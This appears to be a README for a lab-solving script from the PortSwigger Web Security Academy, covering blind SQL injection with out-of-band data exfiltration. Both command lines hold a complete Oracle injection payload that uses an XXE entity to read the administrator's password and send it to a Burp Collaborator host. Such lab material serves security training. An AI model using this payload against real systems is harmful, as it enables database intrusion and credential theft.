# How to run script.py

### Blind SQL injection with out-of-band data exfiltration

Open Burp Collaborator: Open Burp Suite -> Click Burp (top left button) -> Click Burp Collaborator Client -> Click Copy to clipboard -> Now Burp Collaborator Server is running and waiting for requests

Replace the [0-9a-z]{30}.burpcollaborator.net address with the copied one

No Proxy:
- `python3 script.py -u "https://0a8f003104742a39c0f9d8c900b50066.web-security-academy.net/" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.8gp0rin3h4hsj4b5a7l99rpcv31tpi.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"`

Proxy:
- `python3 script.py -u "https://0a8f003104742a39c0f9d8c900b50066.web-security-academy.net/" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.8gp0rin3h4hsj4b5a7l99rpcv31tpi.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--" -p 127.0.0.1:8080`
